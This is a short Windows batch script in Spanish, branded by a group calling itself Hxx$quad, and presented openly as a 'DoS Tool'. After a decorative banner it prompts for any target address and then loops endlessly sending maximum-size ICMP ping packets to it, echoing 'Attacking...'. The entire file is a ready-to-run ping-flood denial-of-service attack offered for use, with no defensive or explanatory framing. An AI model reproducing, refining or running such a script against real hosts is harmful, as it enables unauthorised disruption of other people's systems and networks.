��&cls
@echo off
title #Hxx$quad - DoS Tool
echo.
echo.
echo  DOS TOOL  DOS TOOL      
echo   DOS TOOL  DOS TOOL 
echo    DOS TOOL  DOS TOOL 
echo     DOS TOOL  DOS TOOL 
echo      DOS TOOL  DOS TOOL 
echo                                         [ By Carry ] 
echo          DOS Tool By Hxx$quad
echo           DOS Tool By Hxx$quad
echo            DOS Tool By Hxx$quad
echo             DOS Tool By Hxx$quad
echo              DOS Tool By Hxx$quad
echo               DOS Tool By Hxx$quad
echo                DOS Tool By Hxx$quad
echo                 DOS Tool By Hxx$quad
echo                  DOS Tool By Hxx$quad 
echo -------------------------------------------------
echo        Presiona alguna tecla para seguir 
echo -------------------------------------------------
echo.
echo.
pause >nul
:fnc0
cls
echo           .      #Hxx$quad         .        
echo           .      #Carry            .        
echo           .      #.gg/hxxsquad     .              
echo.
echo.
set /p objdos=Introduce un objetivo para hacer DoS : 
:bucle
ping -l 65500 -n 1 -w 75 %objdos% >nul
echo Enviando paquetes ICMP a : %objdos% - Attacking...
goto bucle
